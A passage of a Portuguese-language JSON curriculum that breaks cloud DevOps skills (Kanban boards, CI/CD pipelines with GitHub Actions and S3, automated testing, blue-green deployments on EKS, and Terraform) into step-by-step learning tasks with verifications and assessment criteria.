                                "DevOps: Integração CI/CD com práticas ágeis.",
                                "Cloud Computing: Uso de serviços PaaS para pipelines.",
                                "Gestão de Projetos: Métricas ágeis em ambientes distribuídos.",
                                "Segurança da Informação: IAM e gates em pipelines.",
                                "Análise de Dados: Dashboards com métricas de performance."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam Scrum adaptado com pipelines AWS para deploys contínuos, reduzindo tempo de feature release de semanas para horas, permitindo respostas rápidas a demandas de mercado em escala global."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.1.1"
                            ]
                          },
                          {
                            "id": "10.1.4.3.1.3",
                            "name": "Aplicar Kanban em fluxos cloud",
                            "description": "Implementar boards Kanban com limites WIP (Work In Progress) em ferramentas como Trello ou Jira conectadas a repositórios cloud para visualização de gargalos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejar o Fluxo de Trabalho Kanban para Ambientes Cloud",
                                  "subSteps": [
                                    "Identifique as etapas principais do seu fluxo de desenvolvimento cloud (ex: Backlog, Análise, Desenvolvimento, Testes, Deploy).",
                                    "Mapeie gargalos potenciais em fluxos cloud, como aprovações de deploy ou integrações de CI/CD.",
                                    "Defina cartões de tarefas representando issues de repositórios cloud (ex: GitHub issues).",
                                    "Estabeleça métricas iniciais como lead time e cycle time para monitoramento.",
                                    "Crie um diagrama simples do fluxo usando ferramentas como Draw.io."
                                  ],
                                  "verification": "Diagrama de fluxo documentado e compartilhado, com pelo menos 5 etapas identificadas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Papel e caneta ou Draw.io",
                                    "Documentação do projeto cloud atual"
                                  ],
                                  "tips": "Comece com fluxos simples; evite sobrecarregar com muitas colunas inicialmente.",
                                  "learningObjective": "Compreender e mapear fluxos de trabalho ágeis adaptados a ambientes cloud.",
                                  "commonMistakes": [
                                    "Ignorar peculiaridades cloud como dependências de infraestrutura",
                                    "Definir etapas muito genéricas sem foco em cloud"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar o Board Kanban na Ferramenta Escolhida",
                                  "subSteps": [
                                    "Crie um novo board no Trello ou Jira com colunas correspondentes ao fluxo planejado.",
                                    "Adicione cartões iniciais de exemplo baseados em tarefas reais de repositórios cloud.",
                                    "Personalize labels para tipos de tarefas (ex: bug, feature, deploy cloud).",
                                    "Ative visualizações como swimlanes para separar ambientes (dev, staging, prod).",
                                    "Configure notificações para movimentações de cartões."
                                  ],
                                  "verification": "Board funcional criado com pelo menos 5 colunas e 3 cartões de exemplo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Conta gratuita em Trello ou Jira",
                                    "Lista de tarefas do projeto"
                                  ],
                                  "tips": "Use templates prontos de Kanban para acelerar a configuração inicial.",
                                  "learningObjective": "Dominar a criação de boards Kanban em ferramentas colaborativas.",
                                  "commonMistakes": [
                                    "Colunas mal nomeadas que não refletem o fluxo real",
                                    "Excesso de customizações desnecessárias no início"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Limites WIP e Regras de Fluxo",
                                  "subSteps": [
                                    "Defina limites WIP para cada coluna (ex: 3 itens em 'Desenvolvimento', 2 em 'Testes').",
                                    "Configure políticas de pull (ex: só mover para próxima coluna se WIP permitir).",
                                    "Adicione checklists aos cartões para sub-tarefas cloud-specific (ex: validar IAM roles).",
                                    "Teste o fluxo movendo cartões manualmente e verificando bloqueios por WIP.",
                                    "Documente regras do board em um cartão fixo 'Regras Kanban'."
                                  ],
                                  "verification": "Limites WIP aplicados e testados com simulação de fluxo completo.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Board configurado do Step 2",
                                    "Guia de melhores práticas Kanban"
                                  ],
                                  "tips": "Comece com limites conservadores e ajuste com base em dados reais de throughput.",
                                  "learningObjective": "Aplicar limites WIP para prevenir sobrecarga em fluxos cloud.",
                                  "commonMistakes": [
                                    "Limites muito altos que não forçam priorização",
                                    "Ignorar exceções para tarefas críticas cloud"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar com Repositórios Cloud e Automatizar Visualizações",
                                  "subSteps": [
                                    "Conecte o board a repositórios GitHub/GitLab via webhooks ou integrações nativas (ex: Jira GitHub app).",
                                    "Configure sincronização automática de issues/pull requests para cartões Kanban.",
                                    "Adicione power-ups/integrações para métricas cloud (ex: tempo de deploy via Butler no Trello).",
                                    "Teste a integração criando uma issue no repo e verificando atualização no board.",
                                    "Configure dashboards para visualizar gargalos (ex: relatórios de WIP acumulado)."
                                  ],
                                  "verification": "Integração ativa: issue criada no repo reflete no board em <5 min.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Conta GitHub/GitLab",
                                    "Tokens de API para integrações"
                                  ],
                                  "tips": "Use apps oficiais para evitar problemas de segurança em integrações cloud.",
                                  "learningObjective": "Integrar ferramentas Kanban com ecossistemas cloud para automação.",
                                  "commonMistakes": [
                                    "Webhooks mal configurados causando duplicatas",
                                    "Falta de permissões IAM para sync"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Monitorar, Analisar Gargalos e Otimizar",
                                  "subSteps": [
                                    "Popule o board com tarefas reais e monitore por 1-2 dias simulados.",
                                    "Analise métricas: identifique colunas com WIP excedido ou tempos altos.",
                                    "Realize daily stand-ups virtuais revisando o board para gargalos cloud.",
                                    "Ajuste limites WIP e fluxo baseado em dados (ex: reduzir WIP em testes se gargalo).",
                                    "Gere relatório inicial de melhorias observadas."
                                  ],
                                  "verification": "Relatório de análise com pelo menos 2 gargalos identificados e ações propostas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Board integrado e populado",
                                    "Ferramentas de métricas como Google Sheets"
                                  ],
                                  "tips": "Use gráficos de fluxo cumulativo (CFD) para visualizações precisas de gargalos.",
                                  "learningObjective": "Usar Kanban para visualizar e resolver gargalos em fluxos cloud.",
                                  "commonMistakes": [
                                    "Análise subjetiva sem métricas",
                                    "Não envolver equipe no monitoramento"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um projeto de migração para AWS, crie um board Trello integrado ao GitHub: coluna 'Backlog' puxa issues; 'Dev' limitado a 4 itens com sync de PRs; visualize gargalo em 'Deploy' onde aprovações demoram, ajustando WIP para 1 e adicionando automação via CodePipeline.",
                              "finalVerifications": [
                                "Board Kanban configurado com WIP limits e fluxo completo mapeado.",
                                "Integração com repo cloud ativa e testada com dados reais.",
                                "Gargalos identificados via métricas (ex: cycle time > 2 dias em uma coluna).",
                                "Relatório de otimização gerado com ajustes propostos.",
                                "Simulação de daily stand-up realizada com movimentação de cartões.",
                                "Regras documentadas e compartilhadas com stakeholders."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento do fluxo cloud (cobertura de 80% das etapas reais).",
                                "Eficácia dos limites WIP (redução simulada de gargalos em >20%).",
                                "Qualidade da integração (sync sem erros em 100% dos testes).",
                                "Profundidade da análise de métricas (pelo menos 3 KPIs rastreados).",
                                "Documentação clara e acionável do board e otimizações.",
                                "Criatividade em conexões cloud-specific (ex: IAM, CI/CD)."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com pipelines CI/CD para automação de deploys.",
                                "Gerenciamento de Projetos: Alinhamento com Scrum para hybrid agile.",
                                "Análise de Dados: Uso de métricas Kanban para dashboards em ferramentas como Power BI.",
                                "Segurança da Informação: Incorporação de checklists para compliance cloud (ex: GDPR).",
                                "Arquitetura de Software: Mapeamento de fluxos microservices em boards."
                              ],
                              "realWorldApplication": "Equipes de DevOps em empresas como Netflix usam Kanban integrado a GitHub e AWS para gerenciar deploys contínuos, visualizando gargalos em aprovações de infraestrutura e reduzindo tempo de release de semanas para horas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.3.2",
                        "name": "Integração Contínua e Entrega Contínua (CI/CD)",
                        "description": "Configuração de pipelines automatizados de CI/CD em plataformas cloud para suportar metodologias ágeis com deploys contínuos e testes automatizados.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.2.1",
                            "name": "Configurar pipeline CI/CD básico",
                            "description": "Criar um pipeline simples usando GitHub Actions ou Jenkins em AWS para build, test e deploy automático de aplicações web na nuvem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e repositório GitHub",
                                  "subSteps": [
                                    "Criar uma conta gratuita no GitHub e AWS se não tiver.",
                                    "Criar um novo repositório público ou privado no GitHub.",
                                    "Clonar o repositório localmente e inicializar um projeto web simples (ex: HTML/JS ou Node.js app).",
                                    "Adicionar arquivos de teste básicos (ex: Jest para Node ou simples assertions).",
                                    "Fazer o primeiro commit e push para o repositório."
                                  ],
                                  "verification": "Verificar se o repositório está online no GitHub com código e testes iniciais commitados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Conta GitHub gratuita",
                                    "Conta AWS Free Tier",
                                    "Git instalado",
                                    "Editor de código (VS Code)"
                                  ],
                                  "tips": "Use templates de repositório para apps web rápidas como 'Node.js starter'.",
                                  "learningObjective": "Entender a base de um repositório pronto para CI/CD.",
                                  "commonMistakes": [
                                    "Esquecer de adicionar .gitignore",
                                    "Não commitar arquivos de teste",
                                    "Usar repositório privado sem token de deploy"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar workflow GitHub Actions para build e test",
                                  "subSteps": [
                                    "Criar diretório .github/workflows no repositório.",
                                    "Adicionar arquivo YAML (ex: ci.yml) com jobs para checkout, setup Node.js, install dependencies, run tests e build.",
                                    "Configurar triggers para push e pull requests nas branches main.",
                                    "Commit e push o workflow para ativar.",
                                    "Verificar a aba Actions no GitHub para runs iniciais."
                                  ],
                                  "verification": "Pipeline executa build e tests automaticamente em push, passando sem erros.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Documentação GitHub Actions",
                                    "Node.js app exemplo"
                                  ],
                                  "tips": "Use actions oficiais como actions/checkout@v4 e actions/setup-node@v4 para simplicidade.",
                                  "learningObjective": "Dominar sintaxe YAML básica para automação de build e test.",
                                  "commonMistakes": [
                                    "Indentação errada no YAML",
                                    "Versões de Node incorretas",
                                    "Falta de cache para node_modules"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar deploy automático para AWS S3",
                                  "subSteps": [
                                    "Criar bucket S3 no AWS Console com configurações públicas para static hosting.",
                                    "Gerar AWS credentials (Access Key IAM com permissões S3).",
                                    "Adicionar secrets no GitHub repo (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY).",
                                    "Estender o workflow YAML com job de deploy: sync arquivos build para S3 usando aws-actions/configure-aws-credentials e aws s3 sync.",
                                    "Commit, push e verificar deploy na URL do S3 bucket."
                                  ],
                                  "verification": "App web é deployada automaticamente para S3 e acessível via URL pública após push.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "AWS CLI instalado localmente para testes",
                                    "Documentação AWS S3 static hosting"
                                  ],
                                  "tips": "Habilite versioning no bucket para rollbacks fáceis.",
                                  "learningObjective": "Implementar deploy serverless seguro com secrets.",
                                  "commonMistakes": [
                                    "Permissões IAM insuficientes",
                                    "Expor secrets no código",
                                    "Bucket não configurado para public read"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, monitorar e otimizar o pipeline",
                                  "subSteps": [
                                    "Introduzir uma mudança no código, push e observar o pipeline completo.",
                                    "Analisar logs de falhas na aba Actions e corrigir.",
                                    "Adicionar notifications (ex: Slack ou email via actions).",
                                    "Otimizar com matrix strategy para múltiplas versões de Node.",
                                    "Documentar o pipeline no README.md."
                                  ],
                                  "verification": "Pipeline falha graciosamente em erros, notifica e recupera em fixes.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Acesso a logs GitHub Actions"
                                  ],
                                  "tips": "Use badges no README para status do pipeline.",
                                  "learningObjective": "Garantir robustez e observabilidade no CI/CD.",
                                  "commonMistakes": [
                                    "Ignorar warnings nos logs",
                                    "Sem handling de falhas",
                                    "Pipeline muito lento sem cache"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma app Node.js simples com Express que serve uma página 'Hello World'. Configure o pipeline para build (npm build), test (Jest unit tests) e deploy para S3. Após push, a app fica live em https://seu-bucket.s3.amazonaws.com/index.html em <5 minutos.",
                              "finalVerifications": [
                                "Pipeline completa build, test e deploy sem intervenção manual em push para main.",
                                "Tests passam com coverage >80%.",
                                "App deployada é acessível e reflete últimas mudanças.",
                                "Secrets não expostos no código ou logs.",
                                "Tempo total de pipeline <3 minutos.",
                                "Falhas são notificadas via email/Slack."
                              ],
                              "assessmentCriteria": [
                                "Automação end-to-end funcional (build-test-deploy).",
                                "Uso correto de YAML, actions e secrets.",
                                "Tratamento de erros e otimizações (cache, matrix).",
                                "Documentação clara no README.",
                                "Integração segura com AWS.",
                                "Escalabilidade demonstrada (ex: multi-env)."
                              ],
                              "crossCurricularConnections": [
                                "Cloud Computing: Gerenciamento de recursos AWS S3.",
                                "Desenvolvimento Ágil: Integração com Git workflows.",
                                "Segurança da Informação: Manejo de IAM e secrets.",
                                "Infraestrutura como Código: Próximo passo para Terraform.",
                                "Monitoramento: Integração com CloudWatch."
                              ],
                              "realWorldApplication": "Empresas como Netflix e Etsy usam CI/CD para deploy diário de milhares de mudanças, reduzindo tempo de release de semanas para minutos, minimizando downtimes e erros humanos em produção."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.1.2"
                            ]
                          },
                          {
                            "id": "10.1.4.3.2.2",
                            "name": "Integrar testes automatizados em CI/CD",
                            "description": "Incorporar testes unitários, de integração e de carga com ferramentas como Selenium e JUnit em pipelines cloud para garantir qualidade ágil.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Desenvolver e Organizar Testes Automatizados",
                                  "subSteps": [
                                    "Instale dependências: JUnit para unitários, Selenium WebDriver para end-to-end, e JMeter para carga.",
                                    "Escreva testes unitários cobrindo 80% do código com JUnit e Mockito.",
                                    "Crie testes de integração para APIs e banco de dados.",
                                    "Desenvolva scripts Selenium para fluxos de usuário na UI.",
                                    "Configure testes de carga com JMeter simulando 100 usuários concurrentes."
                                  ],
                                  "verification": "Execute 'mvn test' ou equivalente localmente; todos testes devem passar com relatório de cobertura >70%.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": [
                                    "JDK 11+, Maven/Gradle",
                                    "Selenium WebDriver",
                                    "JUnit 5",
                                    "JMeter",
                                    "IDE como IntelliJ"
                                  ],
                                  "tips": "Use Page Object Model no Selenium para manutenibilidade; priorize testes flaky-free.",
                                  "learningObjective": "Dominar criação de suíte de testes abrangentes para diferentes níveis.",
                                  "commonMistakes": [
                                    "Ignorar mocks em unit tests",
                                    "Testes Selenium sem headless mode",
                                    "Sobrecarga de cenários em testes de carga"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Pipeline CI/CD na Nuvem",
                                  "subSteps": [
                                    "Escolha plataforma: GitHub Actions, GitLab CI ou AWS CodePipeline.",
                                    "Crie arquivo de configuração (ex: .github/workflows/ci-cd.yml).",
                                    "Defina triggers: push/merge em main/develop.",
                                    "Configure jobs iniciais: build, lint e scan de segurança.",
                                    "Integre cache para dependências para acelerar builds."
                                  ],
                                  "verification": "Commit e push; verifique no dashboard da plataforma se pipeline inicia e completa build básico.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Conta GitHub/AWS",
                                    "Repositório Git com app de exemplo (Spring Boot/Node.js)",
                                    "Documentação da plataforma CI/CD"
                                  ],
                                  "tips": "Use matrix strategy para testar múltiplas versões de runtime; habilite secrets para credenciais.",
                                  "learningObjective": "Configurar pipeline básico escalável na nuvem.",
                                  "commonMistakes": [
                                    "Hardcodear credenciais",
                                    "Ausência de cache",
                                    "Triggers muito amplos causando builds desnecessários"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Testes no Pipeline",
                                  "subSteps": [
                                    "Adicione stage de testes unitários após build.",
                                    "Insira job paralelo para testes de integração e Selenium (use services Docker para DB/browser).",
                                    "Configure stage de carga com JMeter em container.",
                                    "Use thresholds: falha se cobertura <80% ou taxa de erro >5%.",
                                    "Gere relatórios (Allure/JUnit XML) e publique como artifacts."
                                  ],
                                  "verification": "Trigger pipeline; confirme que todos testes rodam sequencial/parallel e relatórios são gerados.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "Docker Compose para services",
                                    "Allure para reports",
                                    "Codecov/SonarQube para coverage"
                                  ],
                                  "tips": "Rode Selenium em modo headless com Xvfb; paralelize jobs para <10min total.",
                                  "learningObjective": "Incorporar testes multinível em CI/CD com gates de qualidade.",
                                  "commonMistakes": [
                                    "Testes dependentes de ambiente local",
                                    "Sem timeouts em testes de carga",
                                    "Ignorar relatórios de falhas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Monitoramento, Notificações e Deploy Condicional",
                                  "subSteps": [
                                    "Adicione stage de deploy só se testes passarem (usando needs: [test-stage]).",
                                    "Integre Slack/Email notifications para falhas.",
                                    "Configure monitoramento com Prometheus/Grafana para métricas de pipeline.",
                                    "Habilite rollback automático em falhas pós-deploy.",
                                    "Teste end-to-end: simule falha em teste e verifique bloqueio de deploy."
                                  ],
                                  "verification": "Simule falha em código; pipeline falha testes, notifica e não deploya.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Slack webhook",
                                    "Prometheus/Grafana",
                                    "Helm/K8s para deploy opcional"
                                  ],
                                  "tips": "Use environment protections no GitHub para aprovações manuais em prod.",
                                  "learningObjective": "Garantir qualidade ágil com feedback rápido e deploys seguros.",
                                  "commonMistakes": [
                                    "Deploy sem gates",
                                    "Notificações genéricas sem detalhes",
                                    "Monitoramento só de sucesso"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app e-commerce Spring Boot hospedado no GitHub, configure GitHub Actions: job unit-tests roda JUnit (cobertura 85%), integration-tests usa Testcontainers para DB, selenium-tests em Chrome headless valida checkout, load-tests com JMeter simula 500 users. Deploy para Heroku só se todos passarem, com relatório Allure no summary.",
                              "finalVerifications": [
                                "Pipeline executa todos tipos de testes automaticamente em cada push.",
                                "Cobertura de código >80% reportada e artifacts disponíveis.",
                                "Falha em qualquer teste bloqueia deploy e notifica equipe.",
                                "Tempo total de pipeline <15 minutos em branch main.",
                                "Relatórios detalhados acessíveis via dashboard.",
                                "Testes de carga mantêm performance sob stress simulado."
                              ],
                              "assessmentCriteria": [
                                "Integração completa de unit, integration, E2E e load tests.",
                                "Uso de ferramentas cloud-native (ex: GitHub Actions/AWS).",
                                "Gates de qualidade com thresholds mensuráveis.",
                                "Paralelização e otimização de performance do pipeline.",
                                "Documentação e relatórios automatizados.",
                                "Resiliência a falhas com notificações e rollback."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Automação de infraestrutura como código.",
                                "Qualidade de Software: Métricas de cobertura e TDD/BDD.",
                                "Computação em Nuvem: Serviços serverless para testes (ex: AWS Lambda).",
                                "Gerência Ágil: Feedback loops rápidos em sprints.",
                                "Segurança da Informação: Integração de SAST/DAST em stages."
                              ],
                              "realWorldApplication": "Em times DevOps de fintechs como Nubank, pipelines CI/CD com testes automatizados reduzem defeitos em produção em 70%, aceleram deploys diários e cumprem SLAs de uptime 99.9%, permitindo foco em features inovadoras."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.3.2.3",
                            "name": "Implementar blue-green deployments",
                            "description": "Configurar estratégias de deploy zero-downtime como blue-green em Kubernetes ou ECS na AWS para suportar releases ágeis sem interrupções.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente base no EKS (Elastic Kubernetes Service)",
                                  "subSteps": [
                                    "Criar um cluster EKS usando eksctl ou AWS Console com pelo menos 2 nodes.",
                                    "Instalar kubectl e configurar kubeconfig para acessar o cluster.",
                                    "Criar um namespace dedicado para blue-green deployments (ex: 'production').",
                                    "Deployar uma aplicação inicial simples (ex: nginx) como versão 'blue' usando Deployment e Service.",
                                    "Configurar um Application Load Balancer (ALB) via AWS Load Balancer Controller para roteamento."
                                  ],
                                  "verification": "Verificar com 'kubectl get pods,svc -n production' que o deployment blue está rodando e o serviço expõe porta 80; acessar via ALB DNS sem erros.",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Conta AWS com permissões IAM para EKS",
                                    "eksctl instalado",
                                    "kubectl",
                                    "Helm para AWS Load Balancer Controller",
                                    "Imagem Docker de nginx:latest"
                                  ],
                                  "tips": "Use namespaces separados para isolar blue e green; habilite Cluster Autoscaler para escalabilidade.",
                                  "learningObjective": "Preparar infraestrutura Kubernetes na AWS para suportar deployments zero-downtime.",
                                  "commonMistakes": [
                                    "Esquecer de configurar IAM roles para EKS nodes",
                                    "Não instalar o Load Balancer Controller",
                                    "Usar minikube em produção (use EKS)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir configurações de roteamento e readiness para blue-green",
                                  "subSteps": [
                                    "Criar um Ingress ou Service tipo LoadBalancer com anotações para ALB.",
                                    "Adicionar readiness e liveness probes no Deployment blue para health checks.",
                                    "Configurar labels e selectors únicos para blue (ex: version: blue).",
                                    "Testar health checks manualmente com 'kubectl port-forward'.",
                                    "Preparar um script YAML para green deployment com labels version: green."
                                  ],
                                  "verification": "Simular tráfego no serviço blue via curl ou browser; probes devem retornar 200 OK.",
                                  "estimatedTime": "45 minutes - 1 hour",
                                  "materials": [
                                    "YAML manifests para Ingress/ALB",
                                    "Documentação AWS ALB Ingress Controller",
                                    "Ferramenta curl ou Postman"
                                  ],
                                  "tips": "Use probes com /healthz endpoint; defina initialDelaySeconds para evitar falsos positivos.",
                                  "learningObjective": "Implementar mecanismos de roteamento e health checks essenciais para switches sem downtime.",
                                  "commonMistakes": [
                                    "Probes muito agressivos causando restarts desnecessários",
                                    "Labels inconsistentes entre deployments",
                                    "Service sem sessionAffinity se necessário"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Deployar a versão green e preparar o switch de tráfego",
                                  "subSteps": [
                                    "Atualizar a imagem da app para nova versão (ex: nginx:1.21) e aplicar Deployment green.",
                                    "Escalar green para réplicas idênticas ao blue e aguardar readiness.",
                                    "Atualizar o Ingress para apontar listener rules para green (usando host-based ou path-based routing).",
                                    "Executar script de switch: kubectl patch service para mudar selector de blue para green.",
                                    "Monitorar métricas com 'kubectl top pods' e logs."
                                  ],
                                  "verification": "Verificar zero downtime com 'curl -w %{time_total}' em loop; todos requests servidos por green após switch.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Nova imagem Docker",
                                    "Scripts YAML para green",
                                    "AWS CLI para ALB target groups",
                                    "Prometheus ou kubectl top"
                                  ],
                                  "tips": "Automatize com kustomize ou Helm para parametrização de versions; teste em staging primeiro.",
                                  "learningObjective": "Executar deploy paralelo e switch atômico de tráfego entre ambientes.",
                                  "commonMistakes": [
                                    "Switch prematuro antes de green ready",
                                    "Não sincronizar dados de estado/DB",
                                    "Ignorar sticky sessions em apps stateful"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar, monitorar e implementar rollback se necessário",
                                  "subSteps": [
                                    "Executar testes de carga com tools como Apache Bench ou Locust no endpoint ALB.",
                                    "Monitorar logs e métricas por 10-15 minutos pós-switch.",
                                    "Preparar rollback: patch service de volta para blue selector.",
                                    "Escalar green para 0 réplicas após confirmação.",
                                    "Documentar o processo em um pipeline CI/CD (ex: GitHub Actions ou AWS CodePipeline)."
                                  ],
                                  "verification": "Métricas mostram 100% success rate e latência estável; rollback simulado sem downtime.",
                                  "estimatedTime": "30-45 minutes",
                                  "materials": [
                                    "Apache Bench (ab)",
                                    "AWS CloudWatch para logs/métricas",
                                    "Pipeline YAML para CI/CD"
                                  ],
                                  "tips": "Integre com ArgoCD ou Flux para GitOps; use canary releases como variação.",
                                  "learningObjective": "Garantir estabilidade pós-deploy e capacidade de reversão rápida.",
                                  "commonMistakes": [
                                    "Não testar rollback",
                                    "Deletar blue prematuramente",
                                    "Sobrecarregar cluster sem autoscaling"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação e-commerce hospedada no EKS, deploy blue roda v1.0 com checkout básico. Para v1.1 com novo pagamento, deploy green em paralelo, switch ALB traffic em 30s sem perder carrinhos ativos, verificado por 1000 req/s sem falhas.",
                              "finalVerifications": [
                                "Aplicação acessível via ALB com nova versão sem downtime (>99.99% uptime durante switch).",
                                "Health checks passam para green; blue pode ser escalado para 0.",
                                "Logs mostram tráfego migrado sem erros 5xx.",
                                "Testes de carga confirmam performance equivalente ou melhor.",
                                "Rollback possível em <1min com switch reverso.",
                                "Métricas CloudWatch indicam zero interrupções."
                              ],
                              "assessmentCriteria": [
                                "Tempo total de switch <60s com zero falhas de request.",
                                "Réplicas green alcançam ready state antes do switch.",
                                "Uso correto de probes e selectors para isolamento.",
                                "Documentação de pipeline CI/CD incluída.",
                                "Simulação de rollback bem-sucedida.",
                                "Escalabilidade demonstrada com autoscaler."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD pipelines (Jenkins, GitHub Actions).",
                                "Segurança: Secrets management e network policies no K8s.",
                                "Monitoramento: Prometheus/Grafana para observability.",
                                "Arquitetura de Software: Padrões de design para apps stateless.",
                                "Gestão de Projetos: Suporte a metodologias ágeis com releases frequentes."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam blue-green em Kubernetes para deployar atualizações diárias em milhões de usuários sem interrupções, enquanto AWS recomenda para ECS Fargate em e-commerces de alta disponibilidade como Amazon.com durante Black Friday."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.3.3",
                        "name": "Práticas DevOps na Nuvem",
                        "description": "Integração de DevOps com ágil, focando em automação de infraestrutura, monitoramento e colaboração entre desenvolvimento e operações em cloud.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.3.1",
                            "name": "Aplicar Infrastructure as Code (IaC)",
                            "description": "Escrever scripts Terraform ou CloudFormation para provisionar infraestrutura cloud de forma idempotente e versionada, alinhada a ciclos ágeis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar Ambiente Terraform",
                                  "subSteps": [
                                    "Baixar e instalar Terraform da HashiCorp releases.",
                                    "Configurar credenciais da AWS CLI para autenticação.",
                                    "Inicializar um diretório de projeto com 'terraform init'.",
                                    "Verificar versão com 'terraform version' e provider AWS.",
                                    "Criar arquivo providers.tf com versão pinned."
                                  ],
                                  "verification": "Executar 'terraform init' sem erros e ver arquivos gerados no diretório .terraform.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Computador com Linux/Mac/Windows",
                                    "Conta AWS gratuita",
                                    "Terraform CLI",
                                    "AWS CLI instalado"
                                  ],
                                  "tips": "Use gerenciador de versões como tfenv para múltiplas versões de Terraform.",
                                  "learningObjective": "Configurar ambiente local pronto para desenvolvimento IaC idempotente.",
                                  "commonMistakes": [
                                    "Não configurar credenciais AWS corretamente",
                                    "Ignorar pinning de versões de provider",
                                    "Rodar init em diretório sujo sem .gitignore"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Escrever Configuração Básica de Infraestrutura",
                                  "subSteps": [
                                    "Definir variáveis em variables.tf para região e tags.",
                                    "Criar main.tf com provider AWS e recurso VPC idempotente.",
                                    "Adicionar output.tf para expor IDs de recursos criados.",
                                    "Executar 'terraform plan' para validar sintaxe e preview.",
                                    "Aplicar com 'terraform apply' e confirmar idempotência."
                                  ],
                                  "verification": "'terraform plan' mostra no changes após apply inicial.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Editor de código (VS Code com extensão HashiCorp Terraform)",
                                    "Documentação Terraform AWS provider"
                                  ],
                                  "tips": "Sempre use 'count' ou 'for_each' para recursos condicionais em vez de condicionais inline.",
                                  "learningObjective": "Criar scripts HCL idempotentes que provisionam recursos cloud básicos.",
                                  "commonMistakes": [
                                    "Hardcode valores sensíveis",
                                    "Esquecer de usar variáveis para reusabilidade",
                                    "Não rodar plan antes de apply"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Versionamento e Módulos Reutilizáveis",
                                  "subSteps": [
                                    "Inicializar repositório Git e commit inicial do código Terraform.",
                                    "Criar módulo para subnets em diretório modules/subnets.",
                                    "Refatorar main.tf para usar módulo com variáveis passadas.",
                                    "Adicionar terraform.tfvars para valores default e .gitignore para .tfstate.",
                                    "Tagar versão v1.0.0 e push para GitHub."
                                  ],
                                  "verification": "Git log mostra commits versionados e 'terraform plan' usa módulos corretamente.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Git instalado",
                                    "Repositório GitHub privado/público",
                                    "Documentação Terraform modules"
                                  ],
                                  "tips": "Use semantic versioning (SemVer) para tags Terraform.",
                                  "learningObjective": "Versionar IaC como código fonte, promovendo reusabilidade via módulos.",
                                  "commonMistakes": [
                                    "Commitar .tfstate no Git",
                                    "Não usar remote state backend como S3",
                                    "Módulos sem inputs/outputs bem definidos"
                                  ]
                                },
                                {
